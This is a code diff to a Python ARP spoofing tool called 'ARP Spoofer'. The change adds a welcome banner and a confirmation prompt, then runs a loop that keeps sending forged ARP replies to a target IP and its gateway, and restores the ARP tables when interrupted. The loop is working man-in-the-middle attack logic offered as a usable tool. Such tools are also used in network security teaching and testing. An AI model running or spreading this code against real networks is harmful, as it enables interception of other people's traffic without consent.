@@ -54,17 +54,42 @@ def restoreARP(destination_ip, source_ip):
 
 
 def main():
+    welcome_text = r"""
+  ___  ____________   _____                    __
+ / _ \ | ___ \ ___ \ /  ___|                  / _|
+/ /_\ \| |_/ / |_/ / \ `--. _ __   ___   ___ | |_ ___ _ __
+|  _  ||    /|  __/   `--. \ '_ \ / _ \ / _ \|  _/ _ \ '__|
+| | | || |\ \| |     /\__/ / |_) | (_) | (_) | ||  __/ |
+\_| |_/\_| \_\_|     \____/| .__/ \___/ \___/|_| \___|_|
+                           | |
+                           |_|
+
+Created by : Wathsala Dewmina
+
+    """
+    print(welcome_text)
+
     options = argumentParse()
     packet_count = 0
 
     try:
-        while True:
-            spoof(options.target_ip, options.gateway)
-            spoof(options.gateway, options.target_ip)
-            packet_count += 2
-            print(f"\r[+] Packets sent to {options.target_ip} and {options.gateway} | Packet Count: {packet_count}")
+        confirmation = input("spoofer@arp ~: Do you want to continue this spoofing ? (y/n) : ").lower()
+        if confirmation == 'y':
+            print("spoofer@arp ~: Arguments entered..\n")
+            print(f"[+] Target IP   {options.target_ip}")
+            print(f"[+] Gateway IP  {options.gateway}\n")
 
-            time.sleep(1.5)
+            while True:
+                spoof(options.target_ip, options.gateway)
+                spoof(options.gateway, options.target_ip)
+                packet_count += 2
+                print(f"\r[+] Packets sent to {options.target_ip} and {options.gateway} | P COUNT : {packet_count}")
+
+                time.sleep(1.5)
+        else:
+            print("[+] Exiting...")
+            sys.exit()
+
     except KeyboardInterrupt:
         restoreARP(options.target_ip, options.gateway)
         restoreARP(options.gateway, options.target_ip)
